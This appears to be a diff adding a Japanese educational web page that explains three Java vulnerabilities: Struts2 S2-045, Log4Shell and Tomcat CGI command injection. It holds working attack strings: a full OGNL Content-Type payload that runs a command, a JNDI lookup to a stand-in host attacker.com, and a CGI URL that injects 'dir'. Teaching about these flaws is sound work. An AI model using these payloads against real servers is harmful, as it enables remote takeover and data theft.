@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Java脆弱性デモ (CVEv3) - Critical/High/Medium</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .java-vuln-section { max-width: 900px; margin: 3rem auto; background: #181a2a; border-radius: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.25); padding: 2.5rem; color: #fff; }
+        .java-vuln-section h2 { color: #ffd700; margin-bottom: 1.5rem; }
+        .vuln-list { margin-bottom: 2.5rem; }
+        .vuln-card { background: #23244a; border-radius: 10px; margin-bottom: 2rem; padding: 2rem; box-shadow: 0 4px 16px rgba(0,0,0,0.18); }
+        .vuln-card.critical { border-left: 8px solid #ff3b3b; }
+        .vuln-card.high { border-left: 8px solid #ff9800; }
+        .vuln-card.medium { border-left: 8px solid #ffd700; }
+        .vuln-card h3 { margin-top: 0; margin-bottom: 0.5rem; }
+        .cve-label { font-size: 1rem; font-weight: bold; margin-right: 1rem; }
+        .cve-critical { color: #ff3b3b; }
+        .cve-high { color: #ff9800; }
+        .cve-medium { color: #ffd700; }
+        pre { background: #181a2a; color: #ffd700; border-radius: 6px; padding: 1rem; overflow-x: auto; font-size: 0.95rem; margin-bottom: 1rem; }
+        .danger { color: #ff3b3b; font-weight: bold; }
+        .vuln-desc { margin-bottom: 1rem; }
+        @media (max-width: 700px) { .java-vuln-section { padding: 1rem; } .vuln-card { padding: 1rem; } }
+    </style>
+</head>
+<body>
+    <header>
+        <nav class="navbar">
+            <div class="nav-brand">
+                <h1>☕ Java脆弱性デモ</h1>
+            </div>
+            <div class="nav-links">
+                <a href="index.html">ホーム</a>
+                <a href="#critical">Critical</a>
+                <a href="#high">High</a>
+                <a href="#medium">Medium</a>
+            </div>
+        </nav>
+    </header>
+    <main>
+        <section class="java-vuln-section">
+            <h2>Java脆弱性デモ (CVEv3)</h2>
+            <p>このページはJavaでよく見られるCVEv3のCritical, High, Mediumレベルの脆弱性をデモ・解説します。<br>教育目的であり、実際のシステムでは絶対に真似しないでください。</p>
+            <div class="vuln-list">
+                <div class="vuln-card critical" id="critical">
+                    <span class="cve-label cve-critical">CVE-2017-5638 (Critical)</span>
+                    <h3>Apache Struts2 RCE (S2-045)</h3>
+                    <div class="vuln-desc">Struts2のContent-Typeヘッダ処理のOGNLインジェクションにより、リモートコード実行が可能。攻撃者は任意のコマンドをサーバ上で実行できます。</div>
+                    <pre>// 脆弱なStruts2アクション例
+public class UploadAction extends ActionSupport {
+    private File upload;
+    public String execute() throws Exception {
+        // ファイルアップロード処理
+        return SUCCESS;
+    }
+}
+// Content-Type: %{(#_='multipart/form-data').
+// (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+// (#_memberAccess?((#_memberAccess=#dm)):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+// (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+// (#ognlUtil.getExcludedPackageNames().clear()).
+// (#ognlUtil.getExcludedClasses().clear()).
+// (#context.setMemberAccess(#dm)))).
+// (@java.lang.Runtime@getRuntime().exec('id'))}
+</pre>
+                    <div class="danger">危険性: サーバ完全乗っ取り・情報漏洩・ランサム被害</div>
+                </div>
+                <div class="vuln-card high" id="high">
+                    <span class="cve-label cve-high">CVE-2021-44228 (High)</span>
+                    <h3>Log4Shell (Log4j JNDI RCE)</h3>
+                    <div class="vuln-desc">Log4jのJNDI Lookup機能により、攻撃者が細工したログメッセージを送るだけで任意コード実行が可能。</div>
+                    <pre>// 脆弱なログ出力例
+import org.apache.logging.log4j.*;
+Logger logger = LogManager.getLogger();
+String userInput = request.getParameter("username");
+logger.error(userInput); // ${jndi:ldap://attacker.com/a}
+</pre>
+                    <div class="danger">危険性: サーバ乗っ取り・情報漏洩・ワーム拡散</div>
+                </div>
+                <div class="vuln-card medium" id="medium">
+                    <span class="cve-label cve-medium">CVE-2019-0232 (Medium)</span>
+                    <h3>Tomcat CGI コマンドインジェクション</h3>
+                    <div class="vuln-desc">Windows上のTomcatでCGI有効時、攻撃者が細工したリクエストで任意コマンド実行が可能。</div>
+                    <pre>// web.xmlでCGI有効
+<servlet>
+  <servlet-name>cgi</servlet-name>
+  <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
+  <init-param>
+    <param-name>cgiPathPrefix</param-name>
+    <param-value>WEB-INF/cgi</param-value>
+  </init-param>
+</servlet>
+// 攻撃例: http://target/cgi-bin/test.bat?&dir
+</pre>
+                    <div class="danger">危険性: サーバ操作・情報漏洩</div>
+                </div>
+            </div>
+            <div style="text-align:center; margin-top:2rem;">
+                <a href="index.html" class="btn btn-secondary">← サイトTOPへ戻る</a>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2024 Java脆弱性デモ - 教育目的のみ</p>
+        <p><strong>警告:</strong> このページは意図的に脆弱性を解説しています。本番環境では絶対に使用しないでください。</p>
+    </footer>
+</body>
+</html>
